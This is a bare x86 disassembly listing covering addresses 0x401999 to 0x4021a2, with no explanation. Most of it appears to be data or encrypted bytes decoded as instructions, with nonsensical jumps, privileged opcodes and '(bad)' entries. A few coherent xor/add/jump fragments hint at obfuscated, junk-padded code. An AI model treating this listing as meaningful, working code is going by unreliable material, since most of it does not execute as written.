  401999:	dec    esi
  40199a:	sub    eax,0x8d10f635
  40199f:	call   0xec80429c
  4019a4:	nop
  4019a5:	and    BYTE PTR [edx-0x67],ah
  4019a8:	mov    ebx,0x5c5ce602
  4019ad:	mov    ch,0x54
  4019af:	test   BYTE PTR [esi+ecx*2],bl
  4019b2:	cdq    
  4019b3:	shr    DWORD PTR [ecx],cl
  4019b5:	mov    esp,0x93f0e365
  4019ba:	or     eax,0x6f86c363
  4019bf:	aad    0xfb
  4019c1:	xchg   edi,eax
  4019c2:	data16 cmp cl,bh
  4019c5:	stc    
  4019c6:	jmp    0x1f9f:0x53be73d5
  4019cd:	add    al,0x80
  4019cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019d0:	push   cs
  4019d1:	adc    al,0x52
  4019d3:	inc    ebp
  4019d4:	or     al,0x23
  4019d6:	out    0x25,eax
  4019d8:	push   eax
  4019d9:	mov    eax,0x75ee5a88
  4019de:	mov    BYTE PTR [edx],dl
  4019e0:	push   0x644e77b9
  4019e5:	fcomp  QWORD PTR [edx-0x527488e1]
  4019eb:	adc    eax,0x7f9f2232
  4019f0:	xchg   DWORD PTR [ebx],edi
  4019f2:	xchg   edi,eax
  4019f3:	sub    ebx,esi
  4019f5:	aaa    
  4019f6:	lods   eax,DWORD PTR ds:[esi]
  4019f7:	push   edi
  4019f8:	mov    ds:0x983e7372,eax
  4019fd:	sgdtd  [eax]
  401a00:	leave  
  401a01:	shl    BYTE PTR [ebp+0x4853376a],0x43
  401a08:	ja     0x401a0e
  401a0a:	repnz fs push es
  401a0d:	push   cs
  401a0e:	test   DWORD PTR [ebx+esi*1+0x3ea9f0d3],esp
  401a15:	xchg   ebx,edi
  401a17:	into   
  401a18:	jmp    0x401a55
  401a1a:	jmp    0x401a53
  401a1c:	jae    0x401a9d
  401a1e:	inc    ecx
  401a1f:	in     al,0xf6
  401a21:	fsubr  DWORD PTR [esi]
  401a23:	jne    0x401a16
  401a25:	or     dh,BYTE PTR [eax+0x2acbd7f]
  401a2b:	inc    edx
  401a2c:	pop    edi
  401a2d:	nop
  401a2e:	dec    ecx
  401a2f:	push   ebx
  401a30:	jp     0x401a99
  401a32:	ins    BYTE PTR es:[edi],dx
  401a33:	pop    ecx
  401a34:	out    dx,al
  401a35:	out    dx,eax
  401a36:	push   0xae601e5a
  401a3b:	popa   
  401a3c:	scas   al,BYTE PTR es:[edi]
  401a3d:	cdq    
  401a3e:	out    0xec,eax
  401a40:	int3   
  401a41:	loope  0x4019eb
  401a43:	fsub   DWORD PTR [eax+0x7016a935]
  401a49:	jecxz  0x401a3e
  401a4b:	aas    
  401a4c:	cmp    eax,0xe50e1206
  401a51:	stos   DWORD PTR es:[edi],eax
  401a52:	sub    eax,0xdb51dde0
  401a57:	in     eax,0x31
  401a59:	lods   eax,DWORD PTR ds:[esi]
  401a5a:	or     eax,0xc97afee6
  401a5f:	inc    ebp
  401a60:	mov    eax,0x24228e56
  401a65:	jmp    0x9fb01dc1
  401a6a:	aad    0xc9
  401a6c:	stos   DWORD PTR es:[edi],eax
  401a6d:	jno    0x401a63
  401a6f:	lods   al,BYTE PTR ds:[esi]
  401a70:	and    BYTE PTR [edx],ah
  401a72:	lea    eax,[ecx]
  401a74:	retf   0xfd19
  401a77:	mov    DWORD PTR [ebp-0x50],ebx
  401a7a:	jmp    0x401c1b
  401a7f:	xchg   ecx,eax
  401a80:	mov    al,ds:0xe9b3d9b3
  401a85:	push   ecx
  401a86:	jo     0x401aa0
  401a88:	adc    BYTE PTR [esi],bl
  401a8a:	dec    esp
  401a8b:	cmp    ecx,DWORD PTR [ecx+0x780e7656]
  401a91:	jle    0x401b11
  401a93:	cli    
  401a94:	jg     0x401b14
  401a96:	jle    0x401a98
  401a98:	int3   
  401a99:	fst    DWORD PTR ds:0xf7198b5f
  401a9f:	mov    ch,0x39
  401aa1:	(bad)  
  401aa2:	(bad)  
  401aa3:	mov    bh,0xa3
  401aa5:	fsubr  DWORD PTR [ebp-0x57]
  401aa8:	leave  
  401aa9:	fstp   TBYTE PTR [eax]
  401aab:	jb     0x401b05
  401aad:	pop    edx
  401aae:	cmp    dh,BYTE PTR [edx]
  401ab0:	dec    ebp
  401ab1:	(bad)  
  401ab2:	jg     0x401a7c
  401ab4:	mov    eax,0x7789a3eb
  401ab9:	pop    ss
  401aba:	push   ds
  401abb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401abc:	push   0x3d
  401abe:	push   edx
  401abf:	pop    esp
  401ac0:	mov    esi,0x5c8a7eb
  401ac5:	cld    
  401ac6:	pusha  
  401ac7:	adc    ebx,DWORD PTR [edx-0x18a0b7e6]
  401acd:	inc    edi
  401ace:	cwde   
  401acf:	fs mov esp,0x8dab2d30
  401ad5:	mov    eax,0x2c5058
  401ada:	pop    ebx
  401adb:	retf   0x3a68
  401ade:	jmp    0xb6c5abe3
  401ae3:	add    esp,DWORD PTR [edi-0x144717b4]
  401ae9:	icebp  
  401aea:	jnp    0x401a6c
  401aec:	mov    al,0x88
  401aee:	(bad)
  401af2:	push   0x74
  401af4:	mov    esp,0xa5011027
  401af9:	cmp    eax,0x5b511365
  401afe:	mov    ecx,0x521a285e
  401b03:	outs   dx,DWORD PTR ds:[esi]
  401b04:	sub    ah,cl
  401b06:	nop
  401b07:	dec    edi
  401b08:	daa    
  401b09:	adc    al,0x6d
  401b0b:	ja     0x401add
  401b0d:	or     BYTE PTR [eax],bl
  401b0f:	test   eax,0x580d248c
  401b14:	pop    ebp
  401b15:	cmp    edx,DWORD PTR ds:[esi+edi*8+0x287f3d2c]
  401b1d:	mov    ?,WORD PTR [edi-0x3]
  401b20:	jmp    0xf877:0x7b3758ba
  401b27:	push   cs
  401b28:	cmp    cl,ch
  401b2a:	push   esp
  401b2b:	mov    ds:0xa58ec80f,eax
  401b30:	in     eax,0xbf
  401b32:	jl     0x401b80
  401b34:	rcr    DWORD PTR [edi],cl
  401b36:	or     BYTE PTR ds:0x9a772ca2,al
  401b3c:	xor    DWORD PTR [edx+0x47c5a25d],ebp
  401b42:	ret    
  401b43:	rcl    BYTE PTR [ebx+0x1b26df7],1
  401b49:	mov    esp,0x43dba2f4
  401b4e:	mov    bl,0xa2
  401b50:	mov    dl,0x36
  401b52:	jb     0x401b2c
  401b54:	or     eax,0x24f6921e
  401b59:	jns    0x401af9
  401b5b:	or     DWORD PTR [ecx],esp
  401b5d:	pop    edx
  401b5e:	loop   0x401b4d
  401b60:	mov    edi,0xa7ddf7b8
  401b65:	call   0x281b:0x583aacd7
  401b6c:	xchg   edi,esi
  401b6e:	cmpxchg DWORD PTR [ebx+eiz*2+0x63],ebx
  401b73:	mov    ds:0x3c1f5725,al
  401b78:	or     eax,0x3bfda6d8
  401b7d:	sub    al,0xa0
  401b7f:	jmp    0x21bcd49b
  401b84:	stos   DWORD PTR es:[edi],eax
  401b85:	dec    eax
  401b86:	push   edx
  401b87:	mov    bh,0x6e
  401b89:	add    ch,al
  401b8b:	scas   eax,DWORD PTR es:[edi]
  401b8c:	mov    dh,0xaf
  401b8e:	call   0x1de7166f
  401b93:	addr16 stc 
  401b95:	in     eax,dx
  401b96:	call   0xdc21:0xc0d2137d
  401b9d:	fwait
  401b9e:	push   esi
  401b9f:	je     0x401c12
  401ba1:	stc    
  401ba2:	pusha  
  401ba3:	dec    esi
  401ba4:	jmp    0x6d37fea
  401ba9:	mov    WORD PTR [ecx+esi*1-0x4b60e6b1],gs
  401bb0:	mov    al,ds:0xaf92af24
  401bb5:	test   dl,dh
  401bb7:	retf   0x4e1a
  401bba:	xor    BYTE PTR [eax],0xc4
  401bbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bbe:	xchg   edi,eax
  401bbf:	call   0xe6a5d9ed
  401bc4:	cmp    al,0x5c
  401bc6:	pusha  
  401bc7:	add    dh,BYTE PTR [esi]
  401bc9:	test   DWORD PTR [ebp+0x14],ebx
  401bcc:	sub    eax,DWORD PTR [ecx+0x5978af6f]
  401bd2:	sub    BYTE PTR [eax+0x5f],0xfb
  401bd6:	pop    ds
  401bd7:	inc    esp
  401bd8:	dec    ecx
  401bd9:	scas   al,BYTE PTR es:[edi]
  401bda:	(bad)  
  401bdb:	sbb    eax,DWORD PTR [edi-0x549ed42b]
  401be1:	fwait
  401be2:	adc    DWORD PTR [edi*8+0x4f5fa404],esp
  401be9:	fadd   QWORD PTR [edx-0x2f]
  401bec:	stc    
  401bed:	out    0x8e,al
  401bef:	fist   WORD PTR [esi]
  401bf1:	pop    ss
  401bf2:	call   0x92ed:0xb3315876
  401bf9:	sub    cl,0xc7
  401bfc:	mov    dl,0x74
  401bfe:	jmp    0x987f:0x4e678a0c
  401c05:	jmp    0xdb1c:0xb288dbb6
  401c0c:	or     ebp,edi
  401c0e:	sbb    eax,DWORD PTR [esi+0x47b69dcb]
  401c14:	xchg   bl,ah
  401c16:	lock jg 0x401bb1
  401c19:	mov    DWORD PTR [ecx],eax
  401c1b:	mov    eax,DWORD PTR [ebp-0x50]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	adc    bh,BYTE PTR [edi+edi*8+0x7e798aeb]
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c6e
  401c4d:	aas    
  401c4e:	mov    cl,0xc7
  401c50:	into   
  401c51:	imul   edi,ecx,0xc7227b08
  401c57:	push   edx
  401c58:	mov    fs,WORD PTR [eax-0x601669ba]
  401c5e:	loope  0x401c13
  401c60:	aad    0x2e
  401c62:	shl    BYTE PTR [eax+0x7410be39],1
  401c68:	inc    edx
  401c69:	es pushf 
  401c6b:	push   esp
  401c6c:	rol    BYTE PTR [eax+0x4690f1a2],cl
  401c72:	dec    edi
  401c73:	inc    ebx
  401c74:	dec    eax
  401c75:	adc    eax,0x8bcc9138
  401c7a:	sbb    eax,0x43117845
  401c7f:	dec    edx
  401c80:	push   cs
  401c81:	das    
  401c82:	ins    BYTE PTR es:[edi],dx
  401c83:	(bad)  
  401c84:	jp     0x401cdc
  401c86:	pusha  
  401c87:	ror    al,1
  401c89:	xchg   BYTE PTR [ecx-0x74],bl
  401c8c:	xor    BYTE PTR [ebx],dh
  401c8e:	imul   ebx,DWORD PTR [edi+0x32723a80],0xffffff84
  401c95:	dec    ecx
  401c96:	or     eax,0x225ad303
  401c9b:	test   eax,0x93debca5
  401ca0:	outs   dx,BYTE PTR ds:[esi]
  401ca1:	fdiv   st(0),st
  401ca3:	rcr    DWORD PTR [ecx+eiz*8-0x18c99101],1
  401caa:	or     BYTE PTR [ecx],0x49
  401cad:	and    BYTE PTR [ecx],al
  401caf:	dec    edx
  401cb0:	mov    DWORD PTR [ebx+0x79595a97],edi
  401cb6:	adc    eax,esp
  401cb8:	fisub  DWORD PTR [esi+0x65758288]
  401cbe:	enter  0x1791,0xb3
  401cc2:	jge    0x401d1a
  401cc4:	mov    eax,0x12e3bee3
  401cc9:	test   BYTE PTR [edi+0x2dcb1d68],bh
  401ccf:	add    DWORD PTR [eax-0xa],ebx
  401cd2:	int3   
  401cd3:	sub    edi,DWORD PTR [edi+0x64]
  401cd6:	inc    edx
  401cd7:	shl    DWORD PTR [esp+esi*1],cl
  401cda:	cmc    
  401cdb:	add    ebx,DWORD PTR [edx]
  401cdd:	mov    cs,WORD PTR [ebp+0x42]
  401ce0:	mov    ah,0x5c
  401ce2:	sub    DWORD PTR ds:0x9a1cc1b5,ecx
  401ce8:	xchg   edi,eax
  401ce9:	fst    DWORD PTR [ebp-0x49a31c47]
  401cef:	mov    esi,ecx
  401cf1:	test   al,0xf2
  401cf3:	sub    BYTE PTR [ebx+0x45],bl
  401cf6:	ret    0x9840
  401cf9:	out    0x98,al
  401cfb:	add    DWORD PTR [edi],0x8f168951
  401d01:	mov    esi,0x4f05dc9b
  401d06:	retf   
  401d07:	xor    al,0xa
  401d09:	ds mov eax,0xc8ad5be3
  401d0f:	out    dx,eax
  401d10:	test   DWORD PTR [edi],esi
  401d12:	(bad)  
  401d13:	lock lock jne 0x401d3c
  401d17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d18:	ret    
  401d19:	cmp    eax,0x6c18f453
  401d1e:	test   eax,0xbed33763
  401d23:	adc    eax,0x1183b940
  401d28:	pop    edx
  401d29:	xor    al,0xb6
  401d2b:	jno    0x401cd6
  401d2d:	mov    edx,0x55e77f3c
  401d32:	stos   BYTE PTR es:[edi],al
  401d33:	pop    ebp
  401d34:	xchg   DWORD PTR [ebp-0xf2e81e3],eax
  401d3a:	dec    DWORD PTR [edx-0xf4586eb]
  401d40:	outs   dx,BYTE PTR ds:[esi]
  401d41:	mov    dh,0xb0
  401d43:	push   cs
  401d44:	add    DWORD PTR [esi],eax
  401d46:	not    dh
  401d48:	ss ret 
  401d4a:	cmp    eax,0x65ace4e5
  401d4f:	ins    BYTE PTR es:[edi],dx
  401d50:	xlat   BYTE PTR ds:[ebx]
  401d51:	iret   
  401d52:	pop    ds
  401d53:	mov    esi,0x17326ae2
  401d58:	lods   al,BYTE PTR ds:[esi]
  401d59:	call   0x9894:0x3d064dfc
  401d60:	or     BYTE PTR [eax-0x1b],dl
  401d63:	aas    
  401d64:	xchg   esi,eax
  401d65:	mov    esp,0x4d4eed2b
  401d6a:	(bad)  
  401d6c:	out    dx,eax
  401d6d:	jp     0x401dbe
  401d6f:	clc    
  401d70:	int3   
  401d71:	ds or  ecx,esp
  401d74:	sbb    ecx,ebx
  401d76:	or     ebx,DWORD PTR [edx]
  401d78:	sub    dl,0x4b
  401d7b:	or     ah,ch
  401d7d:	push   esp
  401d7e:	dec    eax
  401d7f:	xchg   ebp,eax
  401d80:	xchg   edi,eax
  401d81:	inc    ebx
  401d82:	and    al,0xa
  401d84:	in     al,0x52
  401d86:	rcr    bl,0xa
  401d89:	test   eax,0xf03b3607
  401d8e:	pop    ecx
  401d8f:	jbe    0x401e05
  401d91:	mov    ebx,0x679c9fe6
  401d96:	inc    edx
  401d97:	jp     0x401d70
  401d99:	shl    DWORD PTR [ebp+0x58d81eaa],1
  401d9f:	inc    DWORD PTR [edi]
  401da1:	jo     0x401ddd
  401da3:	clc    
  401da4:	out    0xcf,eax
  401da6:	push   ebp
  401da7:	int    0x8d
  401da9:	fstp   DWORD PTR [ebx]
  401dab:	inc    ebx
  401dac:	in     al,0x4f
  401dae:	mov    dh,0x99
  401db0:	jmp    0x401db7
  401db2:	dec    esp
  401db3:	sbb    BYTE PTR [ebx+0x272db06e],al
  401db9:	pop    edi
  401dba:	mov    ds:0xf382f6e4,al
  401dbf:	rcl    BYTE PTR [edi-0x46],1
  401dc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dc3:	cmp    BYTE PTR ds:0x54dae005,ch
  401dc9:	fiadd  DWORD PTR [edi-0x44]
  401dcc:	icebp  
  401dcd:	or     BYTE PTR [edi-0x7638fc1d],bh
  401dd3:	inc    ecx
  401dd4:	add    al,0x8b
  401dd6:	inc    ebp
  401dd7:	aam    0x8b
  401dd9:	dec    ebp
  401dda:	clc    
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x64b043c8],ebp
  401e0d:	push   0x16
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401e58
  401e17:	pop    esp
  401e18:	dec    esi
  401e19:	call   0x8be8:0x4b3b04c1
  401e20:	add    al,0x1d
  401e22:	pop    ebx
  401e23:	mov    ds:0xcf5984eb,al
  401e28:	xchg   esi,eax
  401e29:	cwde   
  401e2a:	cli    
  401e2b:	jle    0x401e0a
  401e2d:	sub    eax,0xeee9228b
  401e32:	ds xchg ecx,eax
  401e34:	add    esi,DWORD PTR [edi]
  401e36:	or     dl,ch
  401e38:	dec    edx
  401e39:	lods   al,BYTE PTR ds:[esi]
  401e3a:	inc    esi
  401e3b:	cmp    ch,bl
  401e3d:	jbe    0x401eb5
  401e3f:	jns    0x401e54
  401e41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e42:	pusha  
  401e43:	ret    
  401e44:	cmp    eax,0x19a581e9
  401e49:	out    0x53,eax
  401e4b:	icebp  
  401e4c:	iret   
  401e4d:	jg     0x401e15
  401e4f:	push   es
  401e50:	imul   esi,DWORD PTR [edi],0x1f
  401e53:	outs   dx,DWORD PTR ds:[esi]
  401e54:	test   eax,0x143631f9
  401e59:	jae    0x401de2
  401e5b:	dec    edx
  401e5c:	sar    BYTE PTR [ebx+0x10],cl
  401e5f:	or     BYTE PTR [ebp+0x3a712585],al
  401e65:	pop    ds
  401e66:	leave  
  401e67:	add    ebp,ecx
  401e69:	cvtps2pi mm1,QWORD PTR [edx-0x4bfc4782]
  401e70:	ja     0x401eaa
  401e72:	fild   QWORD PTR [ecx+eiz*1]
  401e75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e76:	ja     0x401e0b
  401e78:	out    dx,al
  401e79:	(bad)  
  401e7a:	xor    eax,0x5f89cb9b
  401e7f:	and    DWORD PTR [ecx+edi*4],esp
  401e82:	mov    ds:0x3097ea2e,al
  401e87:	sbb    DWORD PTR [edx-0x19],ebx
  401e8a:	popf   
  401e8b:	or     DWORD PTR [eax],edx
  401e8d:	outs   dx,DWORD PTR ds:[esi]
  401e8e:	sub    al,BYTE PTR [eax-0x6a]
  401e91:	ins    BYTE PTR es:[edi],dx
  401e92:	inc    ebp
  401e93:	or     BYTE PTR [ebx-0x721b1a78],al
  401e99:	mov    DWORD PTR [eax+0x3a],edi
  401e9c:	js     0x401edb
  401e9e:	fld    TBYTE PTR [ecx-0x5f37c8ca]
  401ea4:	inc    edx
  401ea5:	fld    QWORD PTR [eax+0x1d]
  401ea8:	xor    ebx,DWORD PTR [edx+eax*8-0x1db0f92]
  401eaf:	jl     0x401ee1
  401eb1:	push   ds
  401eb2:	jl     0x401f11
  401eb4:	pop    eax
  401eb5:	cmp    eax,ebp
  401eb7:	sar    bl,1
  401eb9:	mov    eax,0x1576e9c2
  401ebe:	inc    ecx
  401ebf:	cmp    ebp,DWORD PTR [edi-0x2a]
  401ec2:	dec    edi
  401ec3:	clc    
  401ec4:	pop    ds
  401ec5:	sub    eax,0xc6d3f4f4
  401eca:	out    0x3d,eax
  401ecc:	hlt    
  401ecd:	lea    edi,[edi-0x2d]
  401ed0:	lea    ebx,[ecx]
  401ed2:	pop    ecx
  401ed3:	xchg   edi,eax
  401ed4:	call   0xb6d2:0x34f2d233
  401edb:	xchg   edi,eax
  401edc:	(bad)  
  401edd:	mov    ebx,0x26431ecd
  401ee2:	xlat   BYTE PTR ds:[ebx]
  401ee3:	call   0xd3d8e6e8
  401ee8:	push   DWORD PTR [eax+0x2b2d6471]
  401eee:	mov    bl,0x62
  401ef0:	aaa    
  401ef1:	int    0x17
  401ef3:	sub    eax,0xc42049b1
  401ef8:	ins    BYTE PTR es:[edi],dx
  401ef9:	sub    eax,0xdddfd9c8
  401efe:	imul   ebp,DWORD PTR [ebp-0x5efbf273],0xffffff9e
  401f05:	sbb    BYTE PTR [esi-0x72],dh
  401f08:	inc    esp
  401f09:	mov    ebp,0xa113f7f5
  401f0e:	(bad)  
  401f0f:	push   esp
  401f10:	dec    eax
  401f11:	scas   eax,DWORD PTR es:[edi]
  401f12:	sub    esp,DWORD PTR [ecx+ebx*4+0x2a]
  401f16:	les    eax,FWORD PTR [esi-0x2898fa57]
  401f1c:	push   ebp
  401f1d:	xor    eax,0xba9707ab
  401f22:	loopne 0x401ebb
  401f24:	adc    al,0x32
  401f26:	(bad)  
  401f27:	mov    ch,0xf0
  401f29:	std    
  401f2a:	bound  eax,QWORD PTR [ebx+0x7]
  401f2d:	fnstsw WORD PTR [eax]
  401f2f:	pop    esi
  401f30:	mov    edi,0x2ee03cc6
  401f35:	mov    al,0x71
  401f37:	ins    BYTE PTR es:[edi],dx
  401f38:	sbb    dl,ah
  401f3a:	pusha  
  401f3b:	out    0xa0,al
  401f3d:	scas   eax,DWORD PTR es:[edi]
  401f3e:	add    esp,DWORD PTR [edi+0x2b0cd894]
  401f44:	shl    DWORD PTR [edi],0x89
  401f47:	and    al,0x24
  401f49:	adc    DWORD PTR [ecx+0x2],0xffffffdb
  401f4d:	not    DWORD PTR [esi+0x208b68ef]
  401f53:	enter  0x3e3a,0x6b
  401f57:	mov    WORD PTR [eax],ds
  401f59:	push   ebx
  401f5a:	dec    edi
  401f5b:	fs loop 0x401f05
  401f5e:	add    BYTE PTR [edi],0xc7
  401f61:	fbld   TBYTE PTR [eax-0x42]
  401f64:	cmc    
  401f65:	jecxz  0x401fe1
  401f67:	jecxz  0x401f72
  401f69:	ret    
  401f6a:	xchg   DWORD PTR [ebx-0x504f50c7],ebp
  401f70:	out    dx,ax
  401f72:	inc    edx
  401f73:	xor    BYTE PTR [edi],al
  401f75:	and    edi,DWORD PTR [ecx-0x2d66f12]
  401f7b:	pop    esp
  401f7c:	mov    ecx,0x6a1aca5f
  401f81:	mov    dl,0xed
  401f83:	cwde   
  401f84:	aas    
  401f85:	lods   al,BYTE PTR ds:[esi]
  401f86:	fs adc eax,0x7f82d485
  401f8c:	cdq    
  401f8d:	sar    BYTE PTR [esi-0x1e],0x8e
  401f91:	call   0x6b95aed8
  401f96:	mov    dl,0x20
  401f98:	(bad)  
  401f99:	fs je  0x40230d
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0x9cbaef03
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401f75
  401fcc:	push   eax
  401fcd:	inc    eax
  401fce:	fst    st(2)
  401fd0:	arpl   bp,si
  401fd2:	xchg   ebx,eax
  401fd3:	pop    esi
  401fd4:	je     0x402038
  401fd6:	lock in eax,dx
  401fd8:	or     ebp,edx
  401fda:	ror    BYTE PTR [esi],1
  401fdc:	sub    eax,0xe9ccced3
  401fe1:	icebp  
  401fe2:	xor    BYTE PTR [edx-0x3d78c9f4],dl
  401fe8:	xor    eax,0x603494df
  401fed:	add    DWORD PTR [esi+0x2e5c356f],esp
  401ff3:	lahf   
  401ff4:	push   edx
  401ff5:	push   ecx
  401ff6:	ret    
  401ff7:	inc    esp
  401ff8:	mov    ebx,0x6effc11e
  401ffd:	adc    ebx,DWORD PTR [esi+ebx*1-0x28]
  402001:	pushw  ss
  402003:	aad    0x86
  402005:	mov    edx,0x9772cc8e
  40200a:	adc    ecx,ebx
  40200c:	test   DWORD PTR [ecx-0x5c85c1a],0x7068f9c
  402016:	and    DWORD PTR [esi],0xffbb7d47
  40201c:	(bad)  
  40201d:	std    
  40201e:	sbb    cl,BYTE PTR [ebp-0x4]
  402021:	std    
  402022:	pop    ss
  402023:	imul   edi,DWORD PTR [ebx+0x6a],0xffffff88
  402027:	scas   al,BYTE PTR es:[edi]
  402028:	sbb    dh,BYTE PTR [esi-0x52da23b6]
  40202e:	xchg   ebx,eax
  40202f:	mov    ebx,0x4558345b
  402034:	mov    ebp,0x26ef1ca4
  402039:	xchg   edx,eax
  40203a:	cwde   
  40203b:	ds pop esi
  40203d:	imul   eax,DWORD PTR [ecx],0x5d
  402040:	mov    dl,0xfb
  402042:	mov    bl,0x86
  402044:	xchg   DWORD PTR [ecx+0x27],ebp
  402047:	cld    
  402048:	loop   0x402013
  40204a:	out    dx,eax
  40204b:	mov    ebx,0x6257770b
  402050:	push   cs
  402051:	dec    edx
  402052:	ds mov bl,0xcd
  402055:	iret   
  402056:	mov    fs,WORD PTR ds:0x6c2bc881
  40205c:	mov    ebx,0x7ac6636b
  402061:	push   ecx
  402062:	js     0x402054
  402064:	mov    edi,0xb12679fb
  402069:	mov    ss,ebp
  40206b:	cmp    DWORD PTR [esi],esi
  40206d:	into   
  40206e:	cmp    eax,0x214265d8
  402073:	(bad)  
  402074:	xchg   edi,eax
  402075:	rcl    DWORD PTR [ebp+0x3e15a828],cl
  40207b:	adc    DWORD PTR [edi+0x1f],edx
  40207e:	mov    dl,0xa9
  402080:	les    esp,FWORD PTR ds:0xe3698dd9
  402086:	mov    cl,0xe
  402088:	adc    DWORD PTR [esi],ecx
  40208a:	jno    0x402046
  40208c:	push   ebp
  40208d:	inc    esi
  40208e:	push   ebx
  40208f:	mov    ah,0x3d
  402091:	retf   
  402092:	or     esi,DWORD PTR [ebp+0x2]
  402095:	lock inc esp
  402097:	aad    0x45
  402099:	daa    
  40209a:	add    BYTE PTR [ebp+0x3a3fcb3e],al
  4020a0:	sub    DWORD PTR [eax+0x148bf1ed],0x1aff625a
  4020aa:	repz fld TBYTE PTR [edx+ecx*8+0x66a1b6f4]
  4020b2:	arpl   sp,sp
  4020b4:	into   
  4020b5:	and    bl,ch
  4020b7:	mov    al,ds:0xc6229e0f
  4020bc:	adc    eax,0x9e4d07f
  4020c1:	cld    
  4020c2:	fadd   DWORD PTR [eax+0x1c72fdc5]
  4020c8:	mov    ebp,0xfefeed9a
  4020cd:	jp     0x4020de
  4020cf:	mov    bh,dh
  4020d1:	(bad)  
  4020d2:	(bad)  
  4020d3:	mov    edi,0x8c13169e
  4020d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020d9:	cmp    DWORD PTR [eax+0x1d],ebx
  4020dc:	cmp    al,0x61
  4020de:	push   ds
  4020df:	dec    eax
  4020e0:	into   
  4020e1:	adc    al,0x61
  4020e3:	bound  eax,QWORD PTR [ecx+0x72884b69]
  4020e9:	pop    ds
  4020ea:	punpcklbw mm1,DWORD PTR [ecx]
  4020ed:	mov    ds:0x7a0cd3ea,eax
  4020f2:	pop    ds
  4020f3:	(bad)  
  4020f4:	sub    edx,ebx
  4020f6:	shr    DWORD PTR [edx-0x5f],0x2d
  4020fa:	mov    ecx,0x89fb3927
  4020ff:	leave  
  402100:	gs sahf 
  402102:	mov    edx,0x907cf72a
  402107:	sbb    BYTE PTR [edx],al
  402109:	sbb    BYTE PTR [ebp-0x52],al
  40210c:	xor    esi,esp
  40210e:	mov    eax,ds:0x89c152d3
  402113:	imul   esp,DWORD PTR [edi-0x5446aeb7],0xdf839464
  40211d:	clc    
  40211e:	iret   
  40211f:	in     eax,0xaf
  402121:	in     eax,dx
  402122:	mul    esi
  402124:	xor    al,0x3d
  402126:	pop    ss
  402127:	xlat   BYTE PTR gs:[ebx]
  402129:	add    DWORD PTR [ebx-0x26],edx
  40212c:	dec    esp
  40212d:	dec    edi
  40212e:	into   
  40212f:	and    ch,bl
  402131:	cwde   
  402132:	clc    
  402133:	call   0x33bc7b9a
  402138:	add    BYTE PTR [ebx],cl
  40213a:	ret    0x1c3e
  40213d:	xchg   ebx,eax
  40213e:	rcl    edi,cl
  402140:	jle    0x402145
  402142:	pop    ss
  402143:	fidiv  DWORD PTR [ecx+0xd]
  402146:	or     bl,cl
  402148:	mov    ds,edi
  40214a:	(bad)  
  40214b:	push   0x5d
  40214d:	inc    ecx
  40214e:	inc    ebx
  40214f:	push   eax
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	lods   al,BYTE PTR ds:[esi]
  40216a:	jns    0x40218a
  40216c:	fistp  WORD PTR [esi]
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x40215d
  402176:	xor    al,0xa8
  402178:	xchg   esi,eax
  402179:	les    edi,FWORD PTR [eax+0x289b81fa]
  40217f:	mov    al,0x73
  402181:	lods   eax,DWORD PTR ds:[esi]
  402182:	cmp    BYTE PTR [ebx],bl
  402184:	inc    esi
  402185:	mov    ebx,0x7f2d3633
  40218a:	mov    cl,0x3f
  40218c:	sbb    cl,BYTE PTR [eax+0x7d]
  40218f:	push   es
  402190:	mov    edx,DWORD PTR ds:0x88a76404
  402196:	mov    ah,0x34
  402198:	je     0x40216a
  40219a:	jbe    0x402197
  40219c:	inc    eax
  40219d:	mov    ebx,0xecae3abd
  4021a2:	pop    esi
